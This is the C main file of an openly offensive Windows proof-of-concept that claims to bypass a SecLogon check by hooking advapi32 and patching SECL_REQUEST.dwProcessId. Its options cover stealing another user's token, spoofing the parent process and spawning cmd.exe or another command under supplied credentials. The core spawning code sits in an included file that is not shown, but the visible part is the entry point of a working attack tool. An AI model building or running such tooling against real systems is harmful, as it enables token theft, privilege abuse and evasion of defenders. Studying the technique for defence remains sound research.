// SecLogon SECL_REQUEST.dwProcessId bypass PoC
//
// Demonstrates CreateProcessWithLogonW from SYSTEM context
// by hooking the c_SeclCreateProcessWithLogonW call site inside advapi32 and
// patching SECL_REQUEST.dwProcessId to a user-owned PID before the RPC fires.
//
// Research references:
//   https://github.com/CarlosG13/SecLogon-RPC
//   https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html
//
// Build:
//   x86_64-w64-mingw32-gcc main.c -o PoC.exe -lntdll -static -static-libgcc -DDEBUG_BUILD=1
//
// Usage:
//   PoC.exe -u DOMAIN\user -p password [-t steal_user] [--ppid procname]
//           [-c cmdline] [--sleep ms] [--hook]

#include "debug.h"
#include "spawn.h"

static void _usage(const char *prog) {
    printf("\n  SecLogon SECL_REQUEST.dwProcessId bypass PoC\n\n");
    printf("Usage: %s -u DOMAIN\\user -p password [options]\n\n", prog);
    printf("Options:\n");
    printf("  -u <DOMAIN\\user>     target credentials (required)\n");
    printf("  -p <password>        target password (required)\n");
    printf("  -t <username>        steal token from this user (SYSTEM path)\n");
    printf("  --ppid <procname>    preferred parent process name for PPID spoof\n");
    printf("  --hook               force hook even from non-SYSTEM context (showcase)\n");
    printf("  -c <cmdline>         command to spawn (default: cmd.exe)\n");
    printf("  --sleep <ms>         sleep before CPWLW (debugger attach window)\n");
    printf("  -h, --help           show this help\n\n");
}

int main(int argc, char *argv[]) {
    DBG_INFO("SecLogon SECL_REQUEST.dwProcessId bypass PoC by @ippy0kai");

    LPCSTR credUser   = NULL;
    LPCSTR credPass   = NULL;
    LPCSTR targetUser = NULL;
    LPCSTR cmdline    = "cmd.exe";
    LPCSTR ppidName   = NULL;
    DWORD  sleepMs    = 0;
    BOOL   useHook    = FALSE;

    for (int i = 1; i < argc; i++) {
        if      (strcmp(argv[i], "-h")      == 0 ||
                 strcmp(argv[i], "--help")  == 0) { _usage(argv[0]); return 0; }
        else if (strcmp(argv[i], "-u")      == 0 && i+1<argc) credUser   = argv[++i];
        else if (strcmp(argv[i], "-p")      == 0 && i+1<argc) credPass   = argv[++i];
        else if (strcmp(argv[i], "-t")      == 0 && i+1<argc) targetUser = argv[++i];
        else if (strcmp(argv[i], "-c")      == 0 && i+1<argc) cmdline    = argv[++i];
        else if (strcmp(argv[i], "--ppid")  == 0 && i+1<argc) ppidName   = argv[++i];
        else if (strcmp(argv[i], "--sleep") == 0 && i+1<argc)
            sleepMs = (DWORD)strtoul(argv[++i], NULL, 10);
        else if (strcmp(argv[i], "--hook")  == 0) useHook = TRUE;
        else { DBG_ERR("unknown arg: %s", argv[i]); _usage(argv[0]); return 1; }
    }

    if (!credUser || !credPass) {
        DBG_ERR("-u and -p are required");
        _usage(argv[0]); return 1;
    }

    // parse DOMAIN\user
    char domain[256] = {0}, user[256] = {0};
    const char *bs = strchr(credUser, '\\');
    if (bs) {
        size_t dLen = bs - credUser;
        memcpy(domain, credUser, dLen < 255 ? dLen : 255);
        strncpy(user, bs+1, 255);
    } else {
        strncpy(user, credUser, 255);
        strncpy(domain, ".", 255);
    }

    DBG_INFO("Spawn mode: %s\\%s  cmd: %s", domain, user, cmdline);
    if (targetUser) DBG_INFO("Steal-from target (-t): %s", targetUser);
    if (ppidName)   DBG_INFO("Preferred parent (--ppid): %s", ppidName);
    if (useHook)    DBG_INFO("Hook mode: enabled");
    if (sleepMs)    DBG_INFO("Sleep before CPWLW: %lums", sleepMs);

    SpawnWithCreds(domain, user, credPass, cmdline,
                   targetUser, ppidName, sleepMs, useHook);
    return 0;
}
